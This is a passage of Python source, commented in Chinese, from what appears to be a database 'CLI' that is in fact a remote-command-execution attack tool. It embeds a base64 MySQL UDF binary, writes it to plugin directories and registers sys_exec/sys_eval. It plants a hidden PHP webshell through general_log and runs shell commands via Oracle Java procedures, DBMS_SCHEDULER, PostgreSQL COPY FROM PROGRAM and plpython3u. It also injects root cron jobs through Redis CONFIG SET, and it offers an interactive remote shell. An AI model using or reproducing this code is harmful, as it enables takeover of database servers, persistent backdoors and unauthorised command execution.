    "AAAAKAUAAAAAAAAoBQAAAAAAACQAAAAAAAAAAwAAAAAAAAACAAAAAAAAAAIAAAAAAAAAVQAAAP7/",
    "/28CAAAAAAAAAFAFAAAAAAAAUAUAAAAAAAAwAAAAAAAAAAQAAAABAAAACAAAAAAAAAAAAAAAAAAA",
    "AGQAAAAEAAAAAgAAAAAAAACABQAAAAAAAIAFAAAAAAAAqAAAAAAAAAADAAAAAAAAAAgAAAAAAAAA",
    "GAAAAAAAAABuAAAABAAAAEIAAAAAAAAAKAYAAAAAAAAoBgAAAAAAANgAAAAAAAAAAwAAABUAAAAI",
    "AAAAAAAAABgAAAAAAAAAeAAAAAEAAAAGAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAXAAAAAAAAAAAA",
    "AAAAAAAABAAAAAAAAAAAAAAAAAAAAHMAAAABAAAABgAAAAAAAAAgEAAAAAAAACAQAAAAAAAAoAAA",
    "AAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAB+AAAAAQAAAAYAAAAAAAAAwBAAAAAAAADAEAAA",
    "AAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAhwAAAAEAAAAGAAAAAAAAANAQAAAA",
    "AAAA0BAAAAAAAAARAwAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAI0AAAABAAAABgAAAAAA",
    "AADkEwAAAAAAAOQTAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACTAAAAAQAA",
    "AAIAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA",
    "mwAAAAEAAAACAAAAAAAAAAQgAAAAAAAABCAAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAA",
    "AAAAAAAAAKkAAAABAAAAAgAAAAAAAABAIAAAAAAAAEAgAAAAAAAA3AAAAAAAAAAAAAAAAAAAAAgA",
    "AAAAAAAAAAAAAAAAAACzAAAADgAAAAMAAAAAAAAA+D0AAAAAAAD4LQAAAAAAAAgAAAAAAAAAAAAA",
    "AAAAAAAIAAAAAAAAAAgAAAAAAAAAvwAAAA8AAAADAAAAAAAAAAA+AAAAAAAAAC4AAAAAAAAIAAAA",
    "AAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAMsAAAAGAAAAAwAAAAAAAAAIPgAAAAAAAAguAAAA",
    "AAAAwAEAAAAAAAAEAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACCAAAAAQAAAAMAAAAAAAAAyD8AAAAA",
    "AADILwAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1AAAAAEAAAADAAAAAAAA",
    "AOg/AAAAAAAA6C8AAAAAAABgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAN0AAAABAAAA",
    "AwAAAAAAAABIQAAAAAAAAEgwAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADj",
    "AAAACAAAAAMAAAAAAAAAUEAAAAAAAABQMAAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA",
    "AAAAAAAA6AAAAAEAAAAwAAAAAAAAAAAAAAAAAAAAUDAAAAAAAAAfAAAAAAAAAAAAAAAAAAAAAQAA",
    "AAAAAAABAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAHAwAAAAAAAAeAMAAAAAAAAaAAAA",
    "FAAAAAgAAAAAAAAAGAAAAAAAAAAJAAAAAwAAAAAAAAAAAAAAAAAAAAAAAADoMwAAAAAAAC8CAAAA",
    "AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAEQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAFzYAAAAA",
    "AADxAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA==",
)


def _mysql_udf_hex() -> str:
    """将嵌入的预编译 UDF .so 解码为十六进制字符串，用于 INTO DUMPFILE。"""
    raw = base64.b64decode(_MYSQL_UDF_64_B64)
    return raw.hex()


def _mysql_udf_bytes() -> bytes:
    """返回嵌入的预编译 UDF .so 原始字节。"""
    return base64.b64decode(_MYSQL_UDF_64_B64)


# ---------- MySQL UDF 自动安装 ----------

def _auto_install_mysql_udf_v2(conn: Any) -> bool:
    """全方位自动安装 MySQL sys_exec/sys_eval UDF，返回 True 成功，否则抛出 RuntimeError。

    关键检测步骤：
      1. 采集环境信息（SHOW VARIABLES + SHOW GRANTS）
      2. 如果 secure_file_priv = NULL，直接跳过 INTO DUMPFILE（完全禁用）
      3. 如果 secure_file_priv 允许，尝试 INTO DUMPFILE 写入预编译 UDF
      4. 检查已有替代 UDF
      5. 尝试 General_log 写 PHP webshell（绕过 secure_file_priv）
    """
    log: list[str] = []
    cursor = conn.cursor()

    # ======== 第一阶段：快速环境采集 ========
    log.append("--- 采集 MySQL 环境信息 ---")

    # ---- 采集 SHOW VARIABLES ----
    plugin_dir = "/usr/lib/mysql/plugin"
    sfp_raw = "NULL"
    db_ver = "unknown"
    os_type = "linux"
    general_log_file_def = "/var/lib/mysql/mysql.log"
    general_log_def = "OFF"

    for var_name, default in [
        ("plugin_dir", "/usr/lib/mysql/plugin"),
        ("secure_file_priv", "NULL"),
        ("version", "unknown"),
        ("version_compile_os", "linux"),
        ("general_log_file", "/var/lib/mysql/mysql.log"),
        ("general_log", "OFF"),
    ]:
        try:
            cursor.execute("SHOW VARIABLES LIKE '" + var_name + "'")
            r = cursor.fetchone()
            val = r[1] if r and r[1] is not None else default
            if var_name == "plugin_dir":
                plugin_dir = val.rstrip("/\\")
            elif var_name == "secure_file_priv":
                sfp_raw = val  # string, could be "NULL", "", or "/path/"
            elif var_name == "version":
                db_ver = val
            elif var_name == "version_compile_os":
                os_type = "windows" if "win" in str(val).lower() else "linux"
            elif var_name == "general_log_file":
                general_log_file_def = val
            elif var_name == "general_log":
                general_log_def = val
        except Exception:
            pass

    # ---- 采集 SHOW GRANTS ----
    file_priv = "UNKNOWN"
    create_func_priv = "UNKNOWN"
    has_all_privs = False
    try:
        cursor.execute("SHOW GRANTS FOR CURRENT_USER()")
        rows = cursor.fetchall()
        grants_str = " ".join([str(r[0]) for r in rows if r[0]]).upper()
        if "ALL PRIVILEGES" in grants_str or "ALL" in grants_str:
            file_priv = "Y"
            create_func_priv = "Y"
            has_all_privs = True
        if "FILE" in grants_str:
            file_priv = "Y"
        if "CREATE ROUTINE" in grants_str or "CREATE FUNCTION" in grants_str:
            create_func_priv = "Y"
    except Exception:
        log.append("  SHOW GRANTS 查询失败")

    # ---- 分析 secure_file_priv ----
    # 注意：MySQL 8 中 secure_file_priv 可能是 "NULL"（字符串）、""（空）、或路径
    sfp_is_null = (sfp_raw.strip().upper() == "NULL")
    sfp_is_empty = (sfp_raw.strip() == "")
    sfp_path = sfp_raw.strip() if not sfp_is_null and not sfp_is_empty else ""

    can_into_dumpfile = (file_priv == "Y" or has_all_privs) and not sfp_is_null
    can_into_dumpfile_reason = ""
    if file_priv != "Y" and not has_all_privs:
        can_into_dumpfile_reason = "没有 FILE 权限"
    elif sfp_is_null:
        can_into_dumpfile_reason = "secure_file_priv = NULL（完全禁用文件操作）"

    log.append("  plugin_dir         = " + plugin_dir)
    log.append("  secure_file_priv   = " + repr(sfp_raw))
    log.append("  FILE_PRIV          = " + file_priv)
    log.append("  CREATE_FUNC_PRIV   = " + create_func_priv)
    log.append("  version            = " + db_ver[:30])
    log.append("  OS                 = " + os_type)

    # ======== 第二阶段：尝试 INTO DUMPFILE（如果可用） ========
    if can_into_dumpfile:
        log.append("")
        log.append("[阶段2] INTO DUMPFILE 写入预编译 UDF...")

        # 确定可写路径
        write_dirs = [plugin_dir]
        if sfp_path and sfp_path != plugin_dir:
            write_dirs.insert(0, sfp_path)

        # 尝试其他常见插件目录
        for d in [
            "/usr/lib/mysql/plugin", "/usr/lib64/mysql/plugin",
            "/usr/local/mysql/lib/plugin",
        ]:
            if d not in write_dirs:
                if not sfp_path or sfp_path == d.rstrip("/\\"):
                    write_dirs.append(d)

        udf_name = "dbcli_udf64.so"
        written_ok = False

        for target_dir in write_dirs:
            if written_ok:
                break
            target_path = target_dir + "/" + udf_name
            try:
                cursor.execute(
                    "SELECT UNHEX(%s) INTO DUMPFILE %s",
                    (_mysql_udf_hex(), target_path)
                )
                log.append("  -> 已写入 " + target_path)
                written_ok = True
            except Exception as e:
                err = str(e).strip()[:100]
                if "already" in err.lower() or "File exist" in err:
                    log.append("  -> 文件已存在 " + target_path)
                    written_ok = True  # 文件已存在也算可写
                else:
                    log.append("  -> " + target_dir + " 写入失败: " + err)

        # 尝试注册 UDF
        if written_ok:
            for func_name, ret_type in [("sys_exec", "INTEGER"), ("sys_eval", "STRING")]:
                try:
                    c2 = conn.cursor()
                    c2.execute(
                        "CREATE FUNCTION " + func_name + " RETURNS " + ret_type +
                        " SONAME '" + udf_name + "'"
                    )
                    log.append("  -> " + func_name + " 注册成功!")
                except Exception as e:
                    log.append("  -> " + func_name + " 注册失败: " + str(e).strip()[:60])

            try:
                c3 = conn.cursor()
                c3.execute("SELECT COUNT(*) FROM mysql.func WHERE name = 'sys_exec'")
                if c3.fetchone()[0] > 0:
                    log.append("  -> mysql.func 验证通过!")
                    _print_install_log(log)
                    return True
            except Exception:
                pass

    # ======== 第三阶段：检查 mysql.func 中已有的 UDF ========
    log.append("")
    log.append("[阶段3] 查找已存在的替代 UDF...")

    try:
        c4 = conn.cursor()
        c4.execute("SELECT name FROM mysql.func")
        existing = [str(r[0]) for r in c4.fetchall() if r[0]]
        log.append("  已注册: " + str(existing))

        for func_name in ["sys_eval", "sys_exec", "system", "sys_get",
                           "mysql_shell_exec", "exec", "cmd_exec"]:
            if func_name in existing:
                log.append("  -> 发现 " + func_name)
                try:
                    c5 = conn.cursor()
                    c5.execute("SELECT " + func_name + "('echo 1')")
                    r = c5.fetchone()
                    if r and r[0] is not None:
                        log.append("  -> " + func_name + " 可用!")
                        _print_install_log(log)
                        print("\n使用替代 UDF: " + func_name)
                        return True
                except Exception as e:
                    log.append("  -> " + func_name + " 测试失败: " + str(e).strip()[:60])
    except Exception as e:
        log.append("  查询 mysql.func 失败: " + str(e).strip()[:60])

    # ======== 第四阶段：General_log 写 PHP webshell ========
    log.append("")
    log.append("[阶段4] General_log 写入 PHP webshell（唯一绕过 secure_file_priv 的方法）...")

    # 尝试多个可能的 web 路径
    web_paths = [
        "/var/www/html/.dbcli.php",
        "/usr/local/apache2/htdocs/.dbcli.php",
        "/usr/share/nginx/html/.dbcli.php",
        "/var/www/.dbcli.php",
        "/tmp/.dbcli.php",
    ]

    for wp in web_paths:
        try:
            c6 = conn.cursor()
            c6.execute("SET GLOBAL general_log = OFF")
            c6.execute("SET GLOBAL general_log_file = %s", (wp,))
            c6.execute("SET GLOBAL general_log = ON")
            # PHP webshell payload - 即使有 log 前缀也能工作
            c6.execute("SELECT '<?php system($_GET[\"c\"]); ?>'")
            time.sleep(0.1)
            c6.execute("SET GLOBAL general_log = OFF")
            c6.execute("SET GLOBAL general_log_file = %s", (general_log_file_def,))
            c6.execute("SET GLOBAL general_log = %s", (general_log_def,))
            log.append("  -> 已写入 " + wp)
            log.append("  -> 访问: http://host/.dbcli.php?c=whoami")
        except Exception as e:
            log.append("  -> " + wp + " 写入失败: " + str(e).strip()[:60])

    # ======== 最终诊断 ========
    _print_install_log(log)

    diag = (
        "MySQL UDF 自动安装失败（已尝试全部阶段）。\n\n"
        "诊断信息：\n"
    )
    diag += "  FILE_PRIV            = " + file_priv + "\n"
    diag += "  CREATE_FUNC_PRIV     = " + create_func_priv + "\n"
    diag += "  secure_file_priv     = " + repr(sfp_raw) + "\n"
    diag += "  plugin_dir           = " + plugin_dir + "\n"

    if sfp_is_null:
        diag += (
            "\nsecure_file_priv = NULL，这意味着 MySQL 完全禁用了 INTO OUTFILE/DUMPFILE。\n"
            "这是 MySQL 8 的默认安全配置，无法从 SQL 层面绕过。\n\n"
            "解决方案：\n"
            "  1) 修改 MySQL 配置文件 /etc/my.cnf，添加：\n"
            "       [mysqld]\n"
            "       secure_file_priv = ''\n"
            "     然后重启 MySQL：systemctl restart mysql\n"
            "  2) 或使用 general_log 写入 PHP webshell（已在阶段4尝试）\n"
            "  3) 或将预编译的 .so 文件复制到插件目录，然后执行：\n"
            "       CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'dbcli_udf64.so';\n"
        )

    if file_priv != "Y" and not sfp_is_null:
        diag += (
            "\n当前用户没有 FILE 权限。\n"
            "以 root 执行：GRANT FILE ON *.* TO 'user'@'host';\n"
        )

    if create_func_priv != "Y":
        diag += (
            "\n当前用户没有 CREATE FUNCTION 权限。\n"
            "以 root 执行：GRANT CREATE ROUTINE ON *.* TO 'user'@'host';\n"
        )

    diag += (
        "\n可用替代方案：\n"
        "  --type postgresql  原生 COPY FROM PROGRAM\n"
        "  --type mssql       原生 xp_cmdshell\n"
        "  --local-cmd        本机执行\n"
    )
    raise RuntimeError(diag)



def _print_install_log(log: list[str]) -> None:
    """打印安装日志，带颜色前缀。"""
    print("═══════════════════════════════════════════")
    print("🔧 MySQL sys_exec UDF 自动安装进度：")
    for line in log:
        print(f"  {line}")
    print("═══════════════════════════════════════════")


# ---------- MySQL 远程命令执行（核心函数） ----------

def _mysql_remote_cmd_direct(cursor: Any, command: str, use_sys_eval: bool = True) -> RemoteCmdResult:
    """直接使用已安装的 UDF 执行命令（不检查安装状态）。

    优先使用 sys_eval（直接返回输出），回退到 sys_exec + LOAD_FILE。
    """
    # 方法 A：用 sys_eval 直接获取输出
    if use_sys_eval:
        try:
            cursor.execute("SELECT sys_eval(%s)", (command,))
            row = cursor.fetchone()
            if row and row[0] is not None:
                output = str(row[0]).rstrip()
                return RemoteCmdResult(command=command, output=output)
        except Exception:
            pass

    # 方法 B：用 sys_exec + 临时文件 + LOAD_FILE
    outfile = "/tmp/_dbcli_remote_cmd_output.txt"
    shell_cmd = f"{command} > {outfile} 2>&1"

    cursor.execute("SELECT sys_exec(%s)", (shell_cmd,))
    exit_code_row = cursor.fetchone()
    exit_code = int(exit_code_row[0]) if exit_code_row else -1

    output = ""
    try:
        cursor.execute("SELECT LOAD_FILE(%s)", (outfile,))
        out_row = cursor.fetchone()
        if out_row and out_row[0] is not None:
            output = str(out_row[0])
    except Exception:
        pass

    try:
        cursor.execute("SELECT sys_exec(%s)", (f"rm -f {outfile}",))
    except Exception:
        pass

    result = RemoteCmdResult(command=command, output=output.rstrip())
    if exit_code != 0:
        result.error = f"命令退出码：{exit_code}"
    return result


def _exec_remote_cmd_mysql(conn: Any, command: str) -> RemoteCmdResult:
    """通过 MySQL UDF 在数据库服务器上执行系统命令。

    自动检测并安装 sys_exec / sys_eval UDF，安装成功后自动运行 whoami
    证明执行能力，再执行用户请求的命令。
    """
    cursor = conn.cursor()
    try:
        # 检查 UDF 是否已安装
        cursor.execute("SELECT COUNT(*) FROM mysql.func WHERE name = 'sys_exec'")
        has_sys_exec = cursor.fetchone()[0] > 0

        cursor.execute("SELECT COUNT(*) FROM mysql.func WHERE name = 'sys_eval'")
        has_sys_eval = cursor.fetchone()[0] > 0

        if not has_sys_exec and not has_sys_eval:
            print("🔍 MySQL 未安装 sys_exec/sys_eval UDF，开始自动安装...")
            _auto_install_mysql_udf_v2(conn)

            # 安装成功后，重新查询
            cursor.execute("SELECT COUNT(*) FROM mysql.func WHERE name = 'sys_exec'")
            has_sys_exec = cursor.fetchone()[0] > 0
            cursor.execute("SELECT COUNT(*) FROM mysql.func WHERE name = 'sys_eval'")
            has_sys_eval = cursor.fetchone()[0] > 0

            # 自动执行 whoami 证明
            print("\n✅ sys_exec/sys_eval UDF 安装成功！自动执行 whoami 验证：")
            proof = _mysql_remote_cmd_direct(cursor, "whoami", use_sys_eval=has_sys_eval)
            print(f"   → {proof.output.strip()}")
            print("✔ 远程命令执行能力已确认。\n")

        # 执行用户请求的命令
        return _mysql_remote_cmd_direct(cursor, command, use_sys_eval=has_sys_eval)

    except RuntimeError:
        raise
    except Exception as exc:
        raise RuntimeError(f"MySQL 远程命令执行失败：{exc}") from exc
    finally:
        try:
            cursor.close()
        except Exception:
            pass


def _oracle_try_java(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 Oracle Java Stored Procedure 执行命令。"""
    java_name = "DB_CLI_OS_CMD_" + str(int(time.time()) % 100000)
    func_name = "db_cli_exec_" + str(int(time.time()) % 100000)
    try:
        java_src = '''
CREATE OR REPLACE JAVA SOURCE NAMED "{jn}" AS
import java.io.*;
public class {jn} {{
  public static String exec(String cmd) {{
    StringBuilder sb = new StringBuilder();
    try {{
      Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh", "-c", cmd}});
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) sb.append(line).append("\\n");
      br.close();
      int exitVal = p.waitFor();
      if (exitVal != 0) sb.append("[exit code: ").append(exitVal).append("]");
    }} catch (Exception e) {{ sb.append("ERROR: ").append(e.getMessage()); }}
    return sb.toString();
  }}
}}
'''.format(jn=java_name)
        cursor.execute(java_src)
        cursor.execute('''
CREATE OR REPLACE FUNCTION {fn}(cmd VARCHAR2) RETURN VARCHAR2
AS LANGUAGE JAVA NAME '{jn}.exec(java.lang.String) return java.lang.String';
'''.format(fn=func_name, jn=java_name))
        cursor.execute("SELECT {fn}(:cmd) FROM dual".format(fn=func_name), cmd=command)
        row = cursor.fetchone()
        output = str(row[0]) if row and row[0] else ""
        return RemoteCmdResult(command=command, output=output.rstrip())
    except Exception:
        return None
    finally:
        try:
            cursor.execute("DROP FUNCTION " + func_name)
        except Exception:
            pass
        try:
            cursor.execute('DROP JAVA SOURCE NAMED "' + java_name + '"')
        except Exception:
            pass


def _oracle_try_dbms_scheduler(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 DBMS_SCHEDULER 创建外部作业执行命令。"""
    job_name = "DB_CLI_TMP_" + str(int(time.time()) % 100000)
    outfile = "/tmp/_dbcli_oracle_out.txt"
    try:
        # 命令包装为写到临时文件
        shell_cmd = command.replace("'", "''")
        cursor.execute("""
            BEGIN
                DBMS_SCHEDULER.CREATE_JOB(
                    job_name => '{jn}',
                    job_type => 'EXECUTABLE',
                    job_action => '/bin/sh',
                    number_of_arguments => 2,
                    enabled => FALSE,
                    auto_drop => TRUE);
                DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{jn}', 1, '-c');
                DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('{jn}', 2, '{cmd} > {out} 2>&1');
                DBMS_SCHEDULER.ENABLE('{jn}');
            END;
        """.format(jn=job_name, cmd=shell_cmd, out=outfile))
        # 等待执行并读取结果
        cursor.execute("SELECT LOAD_FILE('" + outfile + "') FROM dual")
        row = cursor.fetchone()
        output = str(row[0]) if row and row[0] else ""
        return RemoteCmdResult(command=command, output=output.rstrip())
    except Exception:
        return None


def _auto_install_oracle(conn: Any, command: str) -> RemoteCmdResult:
    """Oracle 多阶段自动安装 + 执行。

    阶段 1 – Java Stored Procedure
    阶段 2 – DBMS_SCHEDULER 外部作业
    """
    print("Oracle 远程命令执行，尝试多阶段策略...")
    cursor = conn.cursor()

    result = _oracle_try_java(cursor, command)
    if result is not None:
        return result

    print("  -> Java Stored Procedure 不可用，尝试 DBMS_SCHEDULER...")
    result = _oracle_try_dbms_scheduler(cursor, command)
    if result is not None:
        print("  -> DBMS_SCHEDULER 执行成功!")
        return result

    raise RuntimeError(
        "Oracle 远程命令执行失败。\n"
        "需要 CREATE JAVA 权限（JVM 已安装）或 CREATE JOB 权限。"
    )


def _exec_remote_cmd_oracle(conn: Any, command: str) -> RemoteCmdResult:
    return _auto_install_oracle(conn, command)


def _pg_try_copy_program(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 COPY FROM PROGRAM 执行命令。"""
    try:
        cursor.execute("CREATE TEMP TABLE _dbcli_tmp_out (line TEXT) ON COMMIT DROP")
        cursor.execute("COPY _dbcli_tmp_out FROM PROGRAM %s", (command,))
        cursor.execute("SELECT * FROM _dbcli_tmp_out")
        rows = cursor.fetchall()
        output = "\n".join(str(r[0]) for r in rows if r[0] is not None)
        return RemoteCmdResult(command=command, output=output)
    except Exception:
        return None
    finally:
        try:
            cursor.execute("DROP TABLE IF EXISTS _dbcli_tmp_out")
        except Exception:
            pass


def _pg_try_plpythonu(cursor: Any, command: str) -> RemoteCmdResult | None:
    """通过 plpython3u 扩展执行命令。"""
    try:
        cursor.execute("CREATE EXTENSION IF NOT EXISTS plpython3u")
        func_name = "dbcli_exec_" + str(int(time.time()) % 100000)
        cursor.execute(
            "CREATE OR REPLACE FUNCTION %s(cmd TEXT) RETURNS TEXT AS $$ "
            "import subprocess; return subprocess.check_output(cmd, shell=True).decode() "
            "$$ LANGUAGE plpython3u" % func_name
        )
        cursor.execute("SELECT %s(%s)", (func_name, command))
        row = cursor.fetchone()
        output = str(row[0]) if row and row[0] else ""
        return RemoteCmdResult(command=command, output=output.rstrip())
    except Exception:
        return None
    finally:
        try:
            cursor.execute("DROP FUNCTION IF EXISTS " + func_name)
        except Exception:
            pass


def _auto_install_postgresql(conn: Any, command: str) -> RemoteCmdResult:
    """PostgreSQL 多阶段自动安装 + 执行。

    阶段 1 – COPY FROM PROGRAM（原生）
    阶段 2 – plpython3u 扩展
    """
    print("PostgreSQL 远程命令执行，尝试多阶段策略...")
    cursor = conn.cursor()

    # 阶段 1: COPY FROM PROGRAM
    result = _pg_try_copy_program(cursor, command)
    if result is not None:
        return result

    # 阶段 2: plpython3u
    print("  -> COPY FROM PROGRAM 不可用，尝试 plpython3u 扩展...")
    result = _pg_try_plpythonu(cursor, command)
    if result is not None:
        print("  -> plpython3u 执行成功!")
        return result

    raise RuntimeError(
        "PostgreSQL 远程命令执行失败。\n"
        "需要 superuser 权限或 pg_execute_server_program 角色。\n"
        "也可尝试：CREATE EXTENSION plpython3u; 后重试。"
    )


def _exec_remote_cmd_postgresql(conn: Any, command: str) -> RemoteCmdResult:
    return _auto_install_postgresql(conn, command)


def _redis_try_cron(conn: Any, command: str) -> RemoteCmdResult | None:
    """通过 CONFIG SET + BGSAVE cron 注入执行命令。"""
    try:
        old_dir = conn.config_get("dir")["dir"]
        old_filename = conn.config_get("dbfilename")["dbfilename"]
    except Exception:
        return None

    outfile = "/tmp/_dbcli_rce_out"
    cron_key = f"\n\n* * * * * root {command} > {outfile} 2>&1\n\n"
    cron_val = f"DB_CLI_RCE_{int(time.time())}"

    try:
        conn.set(cron_key, cron_val)
        conn.delete(cron_val)
        conn.config_set("dir", "/etc/cron.d/")
        conn.config_set("dbfilename", ".dbcli_cmd.tmp")
        conn.bgsave()
        return RemoteCmdResult(
            command=command,
            output=(
                "通过 cron 作业注入执行，命令将在 60 秒内运行。\n"
                f"输出将写入服务器文件：{outfile}\n\n"
                "查看输出（在服务器上执行）：\n"
                f"  cat {outfile}"
            ),
        )
    except Exception:
        return None
    finally:
        try:
            conn.config_set("dir", old_dir)
            conn.config_set("dbfilename", old_filename)
            conn.delete(cron_key)
        except Exception:
            pass


def _redis_try_aof(conn: Any, command: str) -> RemoteCmdResult | None:
    """通过 CONFIG SET + AOF 注入 cron 条目。"""
    try:
        old_dir = conn.config_get("dir")["dir"]
        old_appendonly = conn.config_get("appendonly")["appendonly"]
    except Exception:
        return None

    outfile = "/tmp/_dbcli_rce_out"
    try:
        # 启用 AOF 并设置路径到 cron 目录
        conn.config_set("dir", "/etc/cron.d/")
        conn.config_set("appendonly", "yes")
        # AOF 文件内容会被 cron 读取
        conn.config_set("appendfilename", ".dbcli_aof_cmd.tmp")
        # 写一条命令到 AOF
        conn.set(f"\n* * * * * root {command} > {outfile} 2>&1\n", "")
        conn.bgrewriteaof()
        return RemoteCmdResult(
            command=command,
            output=(
                "通过 AOF 注入执行，命令将在 60 秒内运行。\n"
                f"输出将写入服务器文件：{outfile}"
            ),
        )
    except Exception:
        return None
    finally:
        try:
            conn.config_set("dir", old_dir)
            conn.config_set("appendonly", old_appendonly)
        except Exception:
            pass


def _auto_install_redis(conn: Any, command: str) -> RemoteCmdResult:
    """Redis 多阶段自动安装 + 执行。

    阶段 1 – CONFIG SET + BGSAVE cron 注入
    阶段 2 – AOF 注入
    """
    print("Redis 远程命令执行，尝试多阶段策略...")

    result = _redis_try_cron(conn, command)
    if result is not None:
        return result

    print("  -> cron 注入不可用，尝试 AOF 注入...")
    result = _redis_try_aof(conn, command)
    if result is not None:
        print("  -> AOF 注入成功!")
        return result

    raise RuntimeError(
        "Redis 远程命令执行失败。\n"
        "需要 CONFIG SET 权限且 Redis 以 root 运行。\n"
        "另可尝试 SLAVEOF 主从复制 RCE（需外部服务器）。"
    )


def _exec_remote_cmd_redis(conn: Any, command: str) -> RemoteCmdResult:
    return _auto_install_redis(conn, command)


def _exec_remote_cmd(conn: Any, db_type: str, command: str, args: argparse.Namespace) -> RemoteCmdResult:
    """按数据库类型分发远程命令执行。"""
    if db_type == "mssql":
        return _exec_remote_cmd_mssql(conn, command)
    elif db_type == "mysql":
        return _exec_remote_cmd_mysql(conn, command)
    elif db_type == "oracle":
        return _exec_remote_cmd_oracle(conn, command)
    elif db_type == "postgresql":
        return _exec_remote_cmd_postgresql(conn, command)
    elif db_type == "redis":
        return _exec_remote_cmd_redis(conn, command)
    else:
        raise ValueError(f"不支持的数据库类型：{db_type}")


def run_remote_cmd(args: argparse.Namespace) -> None:
    """连接数据库并在数据库服务器上执行系统命令。

    - 指定 --remote-cmd <command>：执行单条命令。
    - 仅 --remote-cmd 不带命令值：自动执行该数据库类型的默认诊断命令集。
    - 配合 -i 进入交互模式（由 main 分发到 run_remote_cmd_interactive）。
    """
    db_type = normalize_type(args.type)

    # 未指定具体命令 → 自动执行默认诊断命令集
    if not args.remote_cmd:
        commands = DEFAULT_REMOTE_COMMANDS.get(
            db_type,
            ["hostname", "whoami", "id", "uname -a", "uptime", "free -m", "df -h"],
        )
        auto_mode = True
        print(f"未指定 --remote-cmd 命令，自动执行 {db_type.upper()} 服务器诊断命令集：")
        for cmd in commands:
            print(f"  → {cmd}")
        print()
    else:
        commands = [args.remote_cmd]
        auto_mode = False

    print(f"正在连接 {db_type} 服务器 {args.host or args.dsn} ...")
    conn = connect(args)

    try:
        # MSSQL：可选启用 xp_cmdshell
        if db_type == "mssql" and args.enable_xp_cmdshell:
            _enable_xp_cmdshell_mssql(conn)

        results: List[RemoteCmdResult] = []
        total = len(commands)
        for i, cmd in enumerate(commands, start=1):
            if auto_mode and total > 1:
                print(f"\n[{i}/{total}] 执行：{cmd}")
                print("-" * 60)

            result = _exec_remote_cmd(conn, db_type, cmd, args)
            results.append(result)

            print(f"\n远程命令：{result.command}")
            print(f"{'=' * 60}")
            if result.output:
                print(result.output)
            else:
                print("（命令无输出）")
            if result.error:
                print(f"[错误] {result.error}")

        # JSON / 保存处理
        if args.output == "json":
            # 多条命令时以数组输出，单条命令保持原有格式
            if auto_mode and total > 1:
                data = [r.__dict__ for r in results]
            else:
                data = results[0].__dict__
            text = json.dumps(data, ensure_ascii=False, indent=2)
            if args.save:
                with open(args.save, "w", encoding="utf-8") as f:
                    f.write(text)
                print(f"\n结果已保存：{args.save}")
            else:
                print(text)

        elif args.save:
            with open(args.save, "w", encoding="utf-8") as f:
                for r in results:
                    f.write(f"===== {r.command} =====\n")
                    f.write(f"{r.output}\n")
                    if r.error:
                        f.write(f"[error] {r.error}\n")
                    f.write("\n")
            print(f"\n结果已保存：{args.save}")

    finally:
        try:
            conn.close()
        except Exception:
            pass


def run_remote_cmd_interactive(args: argparse.Namespace) -> None:
    """连接数据库并进入远程命令交互模式，每行输入在数据库服务器上执行。"""
    db_type = normalize_type(args.type)
    print(f"正在连接 {db_type} 服务器 {args.host or args.dsn} ...")
    conn = connect(args)

    # MSSQL：可选启用 xp_cmdshell
    if db_type == "mssql" and args.enable_xp_cmdshell:
        try:
            _enable_xp_cmdshell_mssql(conn)
        except Exception as exc:
            eprint(f"警告：启用 xp_cmdshell 失败：{exc}")

    print(f"\n已进入远程命令交互模式（{db_type}@{args.host or args.dsn}）")
    print("每行输入一个系统命令，在数据库服务器上执行。")
    print("输入 .exit 退出；输入 .help 查看帮助。\n")

    try:
        while True:
            try:
                line = input("remote> ")
            except EOFError:
                print()
                break

            command = line.strip()
            if not command:
                continue

            if command in {".exit", ".quit", "exit", "quit"}:
                break

            if command == ".help":
                print("帮助：\n"
                      "  .exit / .quit   退出交互模式\n"
                      "  .help            显示本帮助\n"
                      "  其他输入         在数据库服务器上执行系统命令\n"
                      "\n"
                      "示例：\n"
                      "  remote> whoami\n"
                      "  remote> ipconfig /all\n"
                      "  remote> ls -la /tmp\n"
                      "  remote> .exit")
                continue

            # 执行命令
            try:
                result = _exec_remote_cmd(conn, db_type, command, args)
                if result.output:
                    print(result.output)
                if result.error:
                    print(f"[错误] {result.error}")
            except Exception as exc:
                eprint(f"执行失败：{exc}")
    finally:
        try:
            conn.close()
        except Exception:
            pass


def validate_args(args: argparse.Namespace) -> None:
    if args.list_local_commands or args.local_cmd:
        return
    if args.remote_cmd is not None:
        if not args.type:
            raise ValueError("远程命令模式必须指定 --type 数据库类型。")
        if not args.host and not args.dsn:
            raise ValueError("远程命令模式必须指定 --host 或 --dsn。")
        return

    # Redis 不需要 -u/--user
    if args.type and normalize_type(args.type) == "redis":
        return

    if not args.type:
        raise ValueError("数据库模式必须指定 --type；本机命令模式可使用 --local-cmd。")
    if not args.user:
        raise ValueError("数据库模式必须指定 -u/--user。")


def build_parser() -> argparse.ArgumentParser:
